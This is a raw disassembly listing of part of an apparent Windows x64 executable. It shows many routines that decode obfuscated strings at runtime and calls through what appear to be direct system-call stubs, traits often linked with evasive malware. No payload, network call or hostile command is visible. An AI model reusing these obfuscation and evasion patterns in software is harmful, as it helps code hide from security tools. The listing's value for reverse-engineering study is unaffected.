   1400070ae:	66 89 0d 3b a8 2b 00 	mov    %cx,0x2ba83b(%rip)        # 0x1402c18f0
   1400070b5:	0f b7 0d 36 a8 2b 00 	movzwl 0x2ba836(%rip),%ecx        # 0x1402c18f2
   1400070bc:	81 c1 9d 00 00 00    	add    $0x9d,%ecx
   1400070c2:	0f b6 c9             	movzbl %cl,%ecx
   1400070c5:	66 89 0d 26 a8 2b 00 	mov    %cx,0x2ba826(%rip)        # 0x1402c18f2
   1400070cc:	03 05 22 a8 2b 00    	add    0x2ba822(%rip),%eax        # 0x1402c18f4
   1400070d2:	0f b6 c0             	movzbl %al,%eax
   1400070d5:	66 89 05 18 a8 2b 00 	mov    %ax,0x2ba818(%rip)        # 0x1402c18f4
   1400070dc:	c6 05 13 a8 2b 00 00 	movb   $0x0,0x2ba813(%rip)        # 0x1402c18f6
   1400070e3:	80 3d c8 91 2b 00 00 	cmpb   $0x0,0x2b91c8(%rip)        # 0x1402c02b2
   1400070ea:	0f 84 db 12 00 00    	je     0x1400083cb
   1400070f0:	80 3d 1f a8 2b 00 00 	cmpb   $0x0,0x2ba81f(%rip)        # 0x1402c1916
   1400070f7:	74 5c                	je     0x140007155
   1400070f9:	66 0f 6f 05 ff a7 2b 	movdqa 0x2ba7ff(%rip),%xmm0        # 0x1402c1900
   140007100:	00 
   140007101:	66 0f fd 05 47 4a 00 	paddw  0x4a47(%rip),%xmm0        # 0x14000bb50
   140007108:	00 
   140007109:	66 0f db 05 0f 45 00 	pand   0x450f(%rip),%xmm0        # 0x14000b620
   140007110:	00 
   140007111:	66 0f 7f 05 e7 a7 2b 	movdqa %xmm0,0x2ba7e7(%rip)        # 0x1402c1900
   140007118:	00 
   140007119:	66 0f 6f 05 ef a7 2b 	movdqa 0x2ba7ef(%rip),%xmm0        # 0x1402c1910
   140007120:	00 
   140007121:	66 0f fd 05 47 4a 00 	paddw  0x4a47(%rip),%xmm0        # 0x14000bb70
   140007128:	00 
   140007129:	66 0f db 05 5f 45 00 	pand   0x455f(%rip),%xmm0        # 0x14000b690
   140007130:	00 
   140007131:	66 0f 7e 05 d7 a7 2b 	movd   %xmm0,0x2ba7d7(%rip)        # 0x1402c1910
   140007138:	00 
   140007139:	b8 9d 00 00 00       	mov    $0x9d,%eax
   14000713e:	03 05 d0 a7 2b 00    	add    0x2ba7d0(%rip),%eax        # 0x1402c1914
   140007144:	0f b6 c0             	movzbl %al,%eax
   140007147:	66 89 05 c6 a7 2b 00 	mov    %ax,0x2ba7c6(%rip)        # 0x1402c1914
   14000714e:	c6 05 c1 a7 2b 00 00 	movb   $0x0,0x2ba7c1(%rip)        # 0x1402c1916
   140007155:	80 3d 57 91 2b 00 00 	cmpb   $0x0,0x2b9157(%rip)        # 0x1402c02b3
   14000715c:	0f 84 b8 12 00 00    	je     0x14000841a
   140007162:	80 3d d3 ab 2b 00 00 	cmpb   $0x0,0x2babd3(%rip)        # 0x1402c1d3c
   140007169:	0f 84 b0 00 00 00    	je     0x14000721f
   14000716f:	31 c0                	xor    %eax,%eax
   140007171:	48 8d 0d a0 a7 2b 00 	lea    0x2ba7a0(%rip),%rcx        # 0x1402c1918
   140007178:	66 0f 6f 05 d0 49 00 	movdqa 0x49d0(%rip),%xmm0        # 0x14000bb50
   14000717f:	00 
   140007180:	66 0f 6f 0d 98 44 00 	movdqa 0x4498(%rip),%xmm1        # 0x14000b620
   140007187:	00 
   140007188:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000718f:	00 
   140007190:	f3 0f 6f 14 41       	movdqu (%rcx,%rax,2),%xmm2
   140007195:	f3 0f 6f 5c 41 10    	movdqu 0x10(%rcx,%rax,2),%xmm3
   14000719b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000719f:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400071a3:	66 0f db d1          	pand   %xmm1,%xmm2
   1400071a7:	66 0f db d9          	pand   %xmm1,%xmm3
   1400071ab:	f3 0f 7f 14 41       	movdqu %xmm2,(%rcx,%rax,2)
   1400071b0:	f3 0f 7f 5c 41 10    	movdqu %xmm3,0x10(%rcx,%rax,2)
   1400071b6:	48 3d 00 02 00 00    	cmp    $0x200,%rax
   1400071bc:	74 2e                	je     0x1400071ec
   1400071be:	f3 0f 6f 54 41 20    	movdqu 0x20(%rcx,%rax,2),%xmm2
   1400071c4:	f3 0f 6f 5c 41 30    	movdqu 0x30(%rcx,%rax,2),%xmm3
   1400071ca:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400071ce:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400071d2:	66 0f db d1          	pand   %xmm1,%xmm2
   1400071d6:	66 0f db d9          	pand   %xmm1,%xmm3
   1400071da:	f3 0f 7f 54 41 20    	movdqu %xmm2,0x20(%rcx,%rax,2)
   1400071e0:	f3 0f 7f 5c 41 30    	movdqu %xmm3,0x30(%rcx,%rax,2)
   1400071e6:	48 83 c0 20          	add    $0x20,%rax
   1400071ea:	eb a4                	jmp    0x140007190
   1400071ec:	0f b7 05 45 ab 2b 00 	movzwl 0x2bab45(%rip),%eax        # 0x1402c1d38
   1400071f3:	05 9d 00 00 00       	add    $0x9d,%eax
   1400071f8:	0f b6 c0             	movzbl %al,%eax
   1400071fb:	66 89 05 36 ab 2b 00 	mov    %ax,0x2bab36(%rip)        # 0x1402c1d38
   140007202:	0f b7 05 31 ab 2b 00 	movzwl 0x2bab31(%rip),%eax        # 0x1402c1d3a
   140007209:	05 9d 00 00 00       	add    $0x9d,%eax
   14000720e:	0f b6 c0             	movzbl %al,%eax
   140007211:	66 89 05 22 ab 2b 00 	mov    %ax,0x2bab22(%rip)        # 0x1402c1d3a
   140007218:	c6 05 1d ab 2b 00 00 	movb   $0x0,0x2bab1d(%rip)        # 0x1402c1d3c
   14000721f:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140007226:	00 00 00 00 
   14000722a:	48 8d 1d 7f a6 2b 00 	lea    0x2ba67f(%rip),%rbx        # 0x1402c18b0
   140007231:	48 89 d9             	mov    %rbx,%rcx
   140007234:	e8 c7 33 00 00       	call   0x14000a600
   140007239:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140007240:	01 c0                	add    %eax,%eax
   140007242:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   140007249:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   140007250:	48 89 9d 48 17 00 00 	mov    %rbx,0x1748(%rbp)
   140007257:	66 0f ef c0          	pxor   %xmm0,%xmm0
   14000725b:	66 0f 7f 85 f0 16 00 	movdqa %xmm0,0x16f0(%rbp)
   140007262:	00 
   140007263:	66 0f 7f 85 00 17 00 	movdqa %xmm0,0x1700(%rbp)
   14000726a:	00 
   14000726b:	c7 85 f0 16 00 00 30 	movl   $0x30,0x16f0(%rbp)
   140007272:	00 00 00 
   140007275:	48 89 bd 00 17 00 00 	mov    %rdi,0x1700(%rbp)
   14000727c:	66 0f 7f 85 10 17 00 	movdqa %xmm0,0x1710(%rbp)
   140007283:	00 
   140007284:	48 c7 85 30 17 00 00 	movq   $0x0,0x1730(%rbp)
   14000728b:	00 00 00 00 
   14000728f:	48 8d 8d 30 17 00 00 	lea    0x1730(%rbp),%rcx
   140007296:	4c 8d 85 f0 16 00 00 	lea    0x16f0(%rbp),%r8
   14000729d:	ba 01 00 1f 00       	mov    $0x1f0001,%edx
   1400072a2:	45 31 c9             	xor    %r9d,%r9d
   1400072a5:	e8 95 a2 ff ff       	call   0x14000153f
   1400072aa:	89 c3                	mov    %eax,%ebx
   1400072ac:	48 8b bd 30 17 00 00 	mov    0x1730(%rbp),%rdi
   1400072b3:	48 89 f9             	mov    %rdi,%rcx
   1400072b6:	e8 a3 a1 ff ff       	call   0x14000145e
   1400072bb:	85 db                	test   %ebx,%ebx
   1400072bd:	0f 88 90 00 00 00    	js     0x140007353
   1400072c3:	48 ff c7             	inc    %rdi
   1400072c6:	48 83 ff 02          	cmp    $0x2,%rdi
   1400072ca:	0f 82 83 00 00 00    	jb     0x140007353
   1400072d0:	48 8d 0d e9 0a 01 00 	lea    0x10ae9(%rip),%rcx        # 0x140017dc0
   1400072d7:	4c 8d 85 30 17 00 00 	lea    0x1730(%rbp),%r8
   1400072de:	ba 58 ed 26 00       	mov    $0x26ed58,%edx
   1400072e3:	e8 88 bc ff ff       	call   0x140002f70
   1400072e8:	48 89 c7             	mov    %rax,%rdi
   1400072eb:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400072f0:	48 8d 15 09 a6 2b 00 	lea    0x2ba609(%rip),%rdx        # 0x1402c1900
   1400072f7:	4c 8d 05 1a a6 2b 00 	lea    0x2ba61a(%rip),%r8        # 0x1402c1918
   1400072fe:	48 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%rcx
   140007305:	49 89 c1             	mov    %rax,%r9
   140007308:	e8 a3 c6 ff ff       	call   0x1400039b0
   14000730d:	48 89 c6             	mov    %rax,%rsi
   140007310:	48 8b 85 30 17 00 00 	mov    0x1730(%rbp),%rax
   140007317:	48 89 85 f0 16 00 00 	mov    %rax,0x16f0(%rbp)
   14000731e:	48 89 bd 40 17 00 00 	mov    %rdi,0x1740(%rbp)
   140007325:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   14000732c:	4c 8d 85 f0 16 00 00 	lea    0x16f0(%rbp),%r8
   140007333:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000733a:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140007340:	e8 82 a1 ff ff       	call   0x1400014c7
   140007345:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   140007349:	74 08                	je     0x140007353
   14000734b:	48 89 f1             	mov    %rsi,%rcx
   14000734e:	e8 0b a1 ff ff       	call   0x14000145e
   140007353:	48 8b 8d 88 16 00 00 	mov    0x1688(%rbp),%rcx
   14000735a:	e8 ff a0 ff ff       	call   0x14000145e
   14000735f:	31 c0                	xor    %eax,%eax
   140007361:	0f 28 b5 50 17 00 00 	movaps 0x1750(%rbp),%xmm6
   140007368:	48 81 c4 e8 17 00 00 	add    $0x17e8,%rsp
   14000736f:	5b                   	pop    %rbx
   140007370:	5f                   	pop    %rdi
   140007371:	5e                   	pop    %rsi
   140007372:	41 5c                	pop    %r12
   140007374:	41 5d                	pop    %r13
   140007376:	41 5e                	pop    %r14
   140007378:	41 5f                	pop    %r15
   14000737a:	5d                   	pop    %rbp
   14000737b:	c3                   	ret
   14000737c:	c6 05 a3 90 2b 00 01 	movb   $0x1,0x2b90a3(%rip)        # 0x1402c0426
   140007383:	0f 10 05 70 48 00 00 	movups 0x4870(%rip),%xmm0        # 0x14000bbfa
   14000738a:	0f 29 05 3f 90 2b 00 	movaps %xmm0,0x2b903f(%rip)        # 0x1402c03d0
   140007391:	0f 10 05 72 48 00 00 	movups 0x4872(%rip),%xmm0        # 0x14000bc0a
   140007398:	0f 29 05 41 90 2b 00 	movaps %xmm0,0x2b9041(%rip)        # 0x1402c03e0
   14000739f:	0f 10 05 74 48 00 00 	movups 0x4874(%rip),%xmm0        # 0x14000bc1a
   1400073a6:	0f 29 05 43 90 2b 00 	movaps %xmm0,0x2b9043(%rip)        # 0x1402c03f0
   1400073ad:	0f 10 05 76 48 00 00 	movups 0x4876(%rip),%xmm0        # 0x14000bc2a
   1400073b4:	0f 29 05 45 90 2b 00 	movaps %xmm0,0x2b9045(%rip)        # 0x1402c0400
   1400073bb:	f3 0f 6f 05 77 48 00 	movdqu 0x4877(%rip),%xmm0        # 0x14000bc3a
   1400073c2:	00 
   1400073c3:	66 0f 7f 05 45 90 2b 	movdqa %xmm0,0x2b9045(%rip)        # 0x1402c0410
   1400073ca:	00 
   1400073cb:	48 b8 a0 00 95 00 a2 	movabs $0x3300a2009500a0,%rax
   1400073d2:	00 33 00 
   1400073d5:	48 89 05 42 90 2b 00 	mov    %rax,0x2b9042(%rip)        # 0x1402c041e
   1400073dc:	48 8d 0d dd 10 00 00 	lea    0x10dd(%rip),%rcx        # 0x1400084c0
   1400073e3:	e8 88 9f ff ff       	call   0x140001370
   1400073e8:	c6 05 92 8e 2b 00 01 	movb   $0x1,0x2b8e92(%rip)        # 0x1402c0281
   1400073ef:	80 3d 30 90 2b 00 00 	cmpb   $0x0,0x2b9030(%rip)        # 0x1402c0426
   1400073f6:	0f 85 6b c8 ff ff    	jne    0x140003c67
   1400073fc:	e9 2f c9 ff ff       	jmp    0x140003d30
   140007401:	c6 05 40 90 2b 00 01 	movb   $0x1,0x2b9040(%rip)        # 0x1402c0448
   140007408:	66 0f 6f 05 20 42 00 	movdqa 0x4220(%rip),%xmm0        # 0x14000b630
   14000740f:	00 
   140007410:	66 0f 7f 05 18 90 2b 	movdqa %xmm0,0x2b9018(%rip)        # 0x1402c0430
   140007417:	00 
   140007418:	48 b8 8e 00 93 00 7c 	movabs $0x3f007c0093008e,%rax
   14000741f:	00 3f 00 
   140007422:	48 89 05 17 90 2b 00 	mov    %rax,0x2b9017(%rip)        # 0x1402c0440
   140007429:	48 8d 0d d0 10 00 00 	lea    0x10d0(%rip),%rcx        # 0x140008500
   140007430:	e8 3b 9f ff ff       	call   0x140001370
   140007435:	c6 05 46 8e 2b 00 01 	movb   $0x1,0x2b8e46(%rip)        # 0x1402c0282
   14000743c:	80 3d 05 90 2b 00 00 	cmpb   $0x0,0x2b9005(%rip)        # 0x1402c0448
   140007443:	0f 85 63 ca ff ff    	jne    0x140003eac
   140007449:	e9 a5 ca ff ff       	jmp    0x140003ef3
   14000744e:	c6 05 69 90 2b 00 01 	movb   $0x1,0x2b9069(%rip)        # 0x1402c04be
   140007455:	0f 10 05 f4 47 00 00 	movups 0x47f4(%rip),%xmm0        # 0x14000bc50
   14000745c:	0f 29 05 0d 90 2b 00 	movaps %xmm0,0x2b900d(%rip)        # 0x1402c0470
   140007463:	0f 10 05 f6 47 00 00 	movups 0x47f6(%rip),%xmm0        # 0x14000bc60
   14000746a:	0f 29 05 0f 90 2b 00 	movaps %xmm0,0x2b900f(%rip)        # 0x1402c0480
   140007471:	0f 10 05 f8 47 00 00 	movups 0x47f8(%rip),%xmm0        # 0x14000bc70
   140007478:	0f 29 05 11 90 2b 00 	movaps %xmm0,0x2b9011(%rip)        # 0x1402c0490
   14000747f:	0f 10 05 fa 47 00 00 	movups 0x47fa(%rip),%xmm0        # 0x14000bc80
   140007486:	0f 29 05 13 90 2b 00 	movaps %xmm0,0x2b9013(%rip)        # 0x1402c04a0
   14000748d:	f3 0f 6f 05 f9 47 00 	movdqu 0x47f9(%rip),%xmm0        # 0x14000bc8e
   140007494:	00 
   140007495:	f3 0f 7f 05 11 90 2b 	movdqu %xmm0,0x2b9011(%rip)        # 0x1402c04ae
   14000749c:	00 
   14000749d:	48 8d 0d 9c 10 00 00 	lea    0x109c(%rip),%rcx        # 0x140008540
   1400074a4:	e8 c7 9e ff ff       	call   0x140001370
   1400074a9:	c6 05 d4 8d 2b 00 01 	movb   $0x1,0x2b8dd4(%rip)        # 0x1402c0284
   1400074b0:	80 3d 07 90 2b 00 00 	cmpb   $0x0,0x2b9007(%rip)        # 0x1402c04be
   1400074b7:	0f 85 3c cb ff ff    	jne    0x140003ff9
   1400074bd:	e9 32 cc ff ff       	jmp    0x1400040f4
   1400074c2:	c6 05 61 90 2b 00 01 	movb   $0x1,0x2b9061(%rip)        # 0x1402c052a
   1400074c9:	66 0f 6f 05 ef 41 00 	movdqa 0x41ef(%rip),%xmm0        # 0x14000b6c0
   1400074d0:	00 
   1400074d1:	66 0f 7f 05 37 90 2b 	movdqa %xmm0,0x2b9037(%rip)        # 0x1402c0510
   1400074d8:	00 
   1400074d9:	48 b8 78 00 8b 00 78 	movabs $0x740078008b0078,%rax
   1400074e0:	00 74 00 
   1400074e3:	48 89 05 36 90 2b 00 	mov    %rax,0x2b9036(%rip)        # 0x1402c0520
   1400074ea:	66 c7 05 35 90 2b 00 	movw   $0x37,0x2b9035(%rip)        # 0x1402c0528
   1400074f1:	37 00 
   1400074f3:	48 8d 0d 26 12 00 00 	lea    0x1226(%rip),%rcx        # 0x140008720
   1400074fa:	e8 71 9e ff ff       	call   0x140001370
   1400074ff:	c6 05 80 8d 2b 00 01 	movb   $0x1,0x2b8d80(%rip)        # 0x1402c0286
   140007506:	80 3d 1d 90 2b 00 00 	cmpb   $0x0,0x2b901d(%rip)        # 0x1402c052a
   14000750d:	0f 85 36 cc ff ff    	jne    0x140004149
   140007513:	e9 8d cc ff ff       	jmp    0x1400041a5
   140007518:	48 8d 0d 7f 47 00 00 	lea    0x477f(%rip),%rcx        # 0x14000bc9e
   14000751f:	e8 4c 10 00 00       	call   0x140008570
   140007524:	48 8d 0d c5 11 00 00 	lea    0x11c5(%rip),%rcx        # 0x1400086f0
   14000752b:	e8 40 9e ff ff       	call   0x140001370
   140007530:	c6 05 4e 8d 2b 00 01 	movb   $0x1,0x2b8d4e(%rip)        # 0x1402c0285
   140007537:	80 3d c6 8f 2b 00 00 	cmpb   $0x0,0x2b8fc6(%rip)        # 0x1402c0504
   14000753e:	0f 85 d7 cc ff ff    	jne    0x14000421b
   140007544:	e9 6c cd ff ff       	jmp    0x1400042b5
   140007549:	48 8d 0d 92 47 00 00 	lea    0x4792(%rip),%rcx        # 0x14000bce2
   140007550:	e8 eb 11 00 00       	call   0x140008740
   140007555:	48 8d 0d 44 13 00 00 	lea    0x1344(%rip),%rcx        # 0x1400088a0
   14000755c:	e8 0f 9e ff ff       	call   0x140001370
   140007561:	c6 05 1f 8d 2b 00 01 	movb   $0x1,0x2b8d1f(%rip)        # 0x1402c0287
   140007568:	80 3d ff 8f 2b 00 00 	cmpb   $0x0,0x2b8fff(%rip)        # 0x1402c056e
   14000756f:	0f 85 e0 cd ff ff    	jne    0x140004355
   140007575:	e9 cc ce ff ff       	jmp    0x140004446
   14000757a:	c6 05 01 90 2b 00 01 	movb   $0x1,0x2b9001(%rip)        # 0x1402c0582
   140007581:	66 0f 6f 05 67 41 00 	movdqa 0x4167(%rip),%xmm0        # 0x14000b6f0
   140007588:	00 
   140007589:	66 0f 7f 05 df 8f 2b 	movdqa %xmm0,0x2b8fdf(%rip)        # 0x1402c0570
   140007590:	00 
   140007591:	66 c7 05 e6 8f 2b 00 	movw   $0x7b,0x2b8fe6(%rip)        # 0x1402c0580
   140007598:	7b 00 
   14000759a:	48 8d 0d 1f 13 00 00 	lea    0x131f(%rip),%rcx        # 0x1400088c0
   1400075a1:	e8 ca 9d ff ff       	call   0x140001370
   1400075a6:	c6 05 db 8c 2b 00 01 	movb   $0x1,0x2b8cdb(%rip)        # 0x1402c0288
   1400075ad:	80 3d ce 8f 2b 00 00 	cmpb   $0x0,0x2b8fce(%rip)        # 0x1402c0582
   1400075b4:	0f 85 03 cf ff ff    	jne    0x1400044bd
   1400075ba:	e9 3a cf ff ff       	jmp    0x1400044f9
   1400075bf:	c6 05 e2 8f 2b 00 01 	movb   $0x1,0x2b8fe2(%rip)        # 0x1402c05a8
   1400075c6:	66 0f 6f 05 42 41 00 	movdqa 0x4142(%rip),%xmm0        # 0x14000b710
   1400075cd:	00 
   1400075ce:	66 0f 7f 05 ba 8f 2b 	movdqa %xmm0,0x2b8fba(%rip)        # 0x1402c0590
   1400075d5:	00 
   1400075d6:	48 b8 82 00 95 00 82 	movabs $0x1d008200950082,%rax
   1400075dd:	00 1d 00 
   1400075e0:	48 89 05 b9 8f 2b 00 	mov    %rax,0x2b8fb9(%rip)        # 0x1402c05a0
   1400075e7:	48 8d 0d f2 12 00 00 	lea    0x12f2(%rip),%rcx        # 0x1400088e0
   1400075ee:	e8 7d 9d ff ff       	call   0x140001370
   1400075f3:	c6 05 8f 8c 2b 00 01 	movb   $0x1,0x2b8c8f(%rip)        # 0x1402c0289
   1400075fa:	80 3d a7 8f 2b 00 00 	cmpb   $0x0,0x2b8fa7(%rip)        # 0x1402c05a8
   140007601:	0f 85 41 cf ff ff    	jne    0x140004548
   140007607:	e9 83 cf ff ff       	jmp    0x14000458f
   14000760c:	c6 05 ad 8f 2b 00 01 	movb   $0x1,0x2b8fad(%rip)        # 0x1402c05c0
   140007613:	66 0f 6f 05 25 41 00 	movdqa 0x4125(%rip),%xmm0        # 0x14000b740
   14000761a:	00 
   14000761b:	66 0f 7f 05 8d 8f 2b 	movdqa %xmm0,0x2b8f8d(%rip)        # 0x1402c05b0
   140007622:	00 
   140007623:	48 8d 0d d6 12 00 00 	lea    0x12d6(%rip),%rcx        # 0x140008900
   14000762a:	e8 41 9d ff ff       	call   0x140001370
   14000762f:	c6 05 54 8c 2b 00 01 	movb   $0x1,0x2b8c54(%rip)        # 0x1402c028a
   140007636:	80 3d 83 8f 2b 00 00 	cmpb   $0x0,0x2b8f83(%rip)        # 0x1402c05c0
   14000763d:	0f 85 9b cf ff ff    	jne    0x1400045de
   140007643:	e9 bd cf ff ff       	jmp    0x140004605
   140007648:	c6 05 57 90 2b 00 01 	movb   $0x1,0x2b9057(%rip)        # 0x1402c06a6
   14000764f:	48 8d 0d 7a 8f 2b 00 	lea    0x2b8f7a(%rip),%rcx        # 0x1402c05d0
   140007656:	48 8d 15 c3 46 00 00 	lea    0x46c3(%rip),%rdx        # 0x14000bd20
   14000765d:	41 b8 d6 00 00 00    	mov    $0xd6,%r8d
   140007663:	e8 58 2f 00 00       	call   0x14000a5c0
   140007668:	48 8d 0d a1 12 00 00 	lea    0x12a1(%rip),%rcx        # 0x140008910
   14000766f:	e8 fc 9c ff ff       	call   0x140001370
   140007674:	c6 05 10 8c 2b 00 01 	movb   $0x1,0x2b8c10(%rip)        # 0x1402c028b
   14000767b:	80 3d 24 90 2b 00 00 	cmpb   $0x0,0x2b9024(%rip)        # 0x1402c06a6
   140007682:	0f 85 bc cf ff ff    	jne    0x140004644
   140007688:	e9 3c d1 ff ff       	jmp    0x1400047c9
   14000768d:	c6 05 82 90 2b 00 01 	movb   $0x1,0x2b9082(%rip)        # 0x1402c0716
   140007694:	0f 10 05 5b 47 00 00 	movups 0x475b(%rip),%xmm0        # 0x14000bdf6
   14000769b:	0f 29 05 0e 90 2b 00 	movaps %xmm0,0x2b900e(%rip)        # 0x1402c06b0
   1400076a2:	0f 10 05 5d 47 00 00 	movups 0x475d(%rip),%xmm0        # 0x14000be06
   1400076a9:	0f 29 05 10 90 2b 00 	movaps %xmm0,0x2b9010(%rip)        # 0x1402c06c0
   1400076b0:	0f 10 05 5f 47 00 00 	movups 0x475f(%rip),%xmm0        # 0x14000be16
   1400076b7:	0f 29 05 12 90 2b 00 	movaps %xmm0,0x2b9012(%rip)        # 0x1402c06d0
   1400076be:	0f 10 05 61 47 00 00 	movups 0x4761(%rip),%xmm0        # 0x14000be26
   1400076c5:	0f 29 05 14 90 2b 00 	movaps %xmm0,0x2b9014(%rip)        # 0x1402c06e0
   1400076cc:	0f 10 05 63 47 00 00 	movups 0x4763(%rip),%xmm0        # 0x14000be36
   1400076d3:	0f 29 05 16 90 2b 00 	movaps %xmm0,0x2b9016(%rip)        # 0x1402c06f0
   1400076da:	f3 0f 6f 05 64 47 00 	movdqu 0x4764(%rip),%xmm0        # 0x14000be46
   1400076e1:	00 
   1400076e2:	66 0f 7f 05 16 90 2b 	movdqa %xmm0,0x2b9016(%rip)        # 0x1402c0700
   1400076e9:	00 
   1400076ea:	48 b8 e8 00 f9 00 fb 	movabs $0x8700fb00f900e8,%rax
   1400076f1:	00 87 00 
   1400076f4:	48 89 05 13 90 2b 00 	mov    %rax,0x2b9013(%rip)        # 0x1402c070e
   1400076fb:	48 8d 0d 7e 12 00 00 	lea    0x127e(%rip),%rcx        # 0x140008980
   140007702:	e8 69 9c ff ff       	call   0x140001370
   140007707:	c6 05 7e 8b 2b 00 01 	movb   $0x1,0x2b8b7e(%rip)        # 0x1402c028c
   14000770e:	80 3d 01 90 2b 00 00 	cmpb   $0x0,0x2b9001(%rip)        # 0x1402c0716
   140007715:	0f 85 e5 d0 ff ff    	jne    0x140004800
   14000771b:	e9 bd d1 ff ff       	jmp    0x1400048dd
   140007720:	c6 05 0b 90 2b 00 01 	movb   $0x1,0x2b900b(%rip)        # 0x1402c0732
   140007727:	66 0f 6f 05 51 40 00 	movdqa 0x4051(%rip),%xmm0        # 0x14000b780
   14000772e:	00 
   14000772f:	66 0f 7f 05 e9 8f 2b 	movdqa %xmm0,0x2b8fe9(%rip)        # 0x1402c0720
   140007736:	00 
   140007737:	66 c7 05 f0 8f 2b 00 	movw   $0xf5,0x2b8ff0(%rip)        # 0x1402c0730
   14000773e:	f5 00 
   140007740:	48 8d 0d 79 12 00 00 	lea    0x1279(%rip),%rcx        # 0x1400089c0
   140007747:	e8 24 9c ff ff       	call   0x140001370
   14000774c:	c6 05 3a 8b 2b 00 01 	movb   $0x1,0x2b8b3a(%rip)        # 0x1402c028d
   140007753:	80 3d d8 8f 2b 00 00 	cmpb   $0x0,0x2b8fd8(%rip)        # 0x1402c0732
   14000775a:	0f 85 c4 d1 ff ff    	jne    0x140004924
   140007760:	e9 f9 d1 ff ff       	jmp    0x14000495e
   140007765:	c6 05 66 8b 2b 00 01 	movb   $0x1,0x2b8b66(%rip)        # 0x1402c02d2
   14000776c:	48 b8 17 00 fa 00 fa 	movabs $0x1700fa00fa0017,%rax
   140007773:	00 17 00 
   140007776:	48 89 05 4b 8b 2b 00 	mov    %rax,0x2b8b4b(%rip)        # 0x1402c02c8
   14000777d:	66 c7 05 4a 8b 2b 00 	movw   $0xbb,0x2b8b4a(%rip)        # 0x1402c02d0
   140007784:	bb 00 
   140007786:	48 8d 0d 33 c1 ff ff 	lea    -0x3ecd(%rip),%rcx        # 0x1400038c0
   14000778d:	e8 de 9b ff ff       	call   0x140001370
   140007792:	c6 05 e0 8a 2b 00 01 	movb   $0x1,0x2b8ae0(%rip)        # 0x1402c0279
   140007799:	80 3d 32 8b 2b 00 00 	cmpb   $0x0,0x2b8b32(%rip)        # 0x1402c02d2
   1400077a0:	0f 85 0a d2 ff ff    	jne    0x1400049b0
   1400077a6:	e9 3f d2 ff ff       	jmp    0x1400049ea
   1400077ab:	c6 05 f2 8f 2b 00 01 	movb   $0x1,0x2b8ff2(%rip)        # 0x1402c07a4
   1400077b2:	0f 10 05 a3 46 00 00 	movups 0x46a3(%rip),%xmm0        # 0x14000be5c
   1400077b9:	0f 29 05 80 8f 2b 00 	movaps %xmm0,0x2b8f80(%rip)        # 0x1402c0740
   1400077c0:	0f 10 05 a5 46 00 00 	movups 0x46a5(%rip),%xmm0        # 0x14000be6c
   1400077c7:	0f 29 05 82 8f 2b 00 	movaps %xmm0,0x2b8f82(%rip)        # 0x1402c0750
   1400077ce:	0f 10 05 a7 46 00 00 	movups 0x46a7(%rip),%xmm0        # 0x14000be7c
   1400077d5:	0f 29 05 84 8f 2b 00 	movaps %xmm0,0x2b8f84(%rip)        # 0x1402c0760
   1400077dc:	0f 10 05 a9 46 00 00 	movups 0x46a9(%rip),%xmm0        # 0x14000be8c
   1400077e3:	0f 29 05 86 8f 2b 00 	movaps %xmm0,0x2b8f86(%rip)        # 0x1402c0770
   1400077ea:	0f 10 05 ab 46 00 00 	movups 0x46ab(%rip),%xmm0        # 0x14000be9c
   1400077f1:	0f 29 05 88 8f 2b 00 	movaps %xmm0,0x2b8f88(%rip)        # 0x1402c0780
   1400077f8:	f3 0f 6f 05 ac 46 00 	movdqu 0x46ac(%rip),%xmm0        # 0x14000beac
   1400077ff:	00 
   140007800:	66 0f 7f 05 88 8f 2b 	movdqa %xmm0,0x2b8f88(%rip)        # 0x1402c0790
   140007807:	00 
   140007808:	c7 05 8e 8f 2b 00 47 	movl   $0xf30047,0x2b8f8e(%rip)        # 0x1402c07a0
   14000780f:	00 f3 00 
   140007812:	48 8d 0d c7 11 00 00 	lea    0x11c7(%rip),%rcx        # 0x1400089e0
   140007819:	e8 52 9b ff ff       	call   0x140001370
   14000781e:	c6 05 69 8a 2b 00 01 	movb   $0x1,0x2b8a69(%rip)        # 0x1402c028e
   140007825:	e9 e9 d2 ff ff       	jmp    0x140004b13
   14000782a:	c6 05 cd 8f 2b 00 01 	movb   $0x1,0x2b8fcd(%rip)        # 0x1402c07fe
   140007831:	66 0f 6f 05 a7 3f 00 	movdqa 0x3fa7(%rip),%xmm0        # 0x14000b7e0
   140007838:	00 
   140007839:	66 0f 7f 05 9f 8f 2b 	movdqa %xmm0,0x2b8f9f(%rip)        # 0x1402c07e0
   140007840:	00 
   140007841:	48 b8 ea 00 08 00 04 	movabs $0xe80004000800ea,%rax
   140007848:	00 e8 00 
   14000784b:	48 89 05 9e 8f 2b 00 	mov    %rax,0x2b8f9e(%rip)        # 0x1402c07f0
   140007852:	c7 05 9c 8f 2b 00 0b 	movl   $0xf8000b,0x2b8f9c(%rip)        # 0x1402c07f8
   140007859:	00 f8 00 
   14000785c:	66 c7 05 97 8f 2b 00 	movw   $0x95,0x2b8f97(%rip)        # 0x1402c07fc
   140007863:	95 00 
   140007865:	48 8d 0d c4 12 00 00 	lea    0x12c4(%rip),%rcx        # 0x140008b30
   14000786c:	e8 ff 9a ff ff       	call   0x140001370
   140007871:	c6 05 18 8a 2b 00 01 	movb   $0x1,0x2b8a18(%rip)        # 0x1402c0290
   140007878:	80 3d 7f 8f 2b 00 00 	cmpb   $0x0,0x2b8f7f(%rip)        # 0x1402c07fe
   14000787f:	0f 85 54 d5 ff ff    	jne    0x140004dd9
   140007885:	e9 c9 d5 ff ff       	jmp    0x140004e53
   14000788a:	48 8d 0d 59 46 00 00 	lea    0x4659(%rip),%rcx        # 0x14000beea
   140007891:	e8 ba 12 00 00       	call   0x140008b50
